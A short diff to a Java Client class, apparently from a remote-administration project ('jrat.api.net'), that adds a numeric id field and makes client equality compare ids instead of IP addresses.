@@ -11,6 +11,7 @@ import jrat.api.net.Writer;
 
 public final class Client {
 
+	private final int id;
 	private final String ip;
 	private final Connection con;
 	private final Writer writer;
@@ -19,7 +20,8 @@ public final class Client {
 	private final DataInputStream in;
 	private final DataOutputStream out;
 
-	public Client(String ip, Connection con, Writer writer, Reader reader, DataInputStream in, DataOutputStream out, Queue queue) {
+	public Client(int id, String ip, Connection con, Writer writer, Reader reader, DataInputStream in, DataOutputStream out, Queue queue) {
+		this.id = id;
 		this.ip = ip;
 		this.con = con;
 		this.writer = writer;
@@ -77,7 +79,7 @@ public final class Client {
 	@Override
 	public boolean equals(Object obj) {
 		if (obj instanceof Client) {
-			return this == obj || ((Client) obj).ip.equals(ip);
+			return this == obj || ((Client) obj).id == this.id;
 		}
 
 		return false;
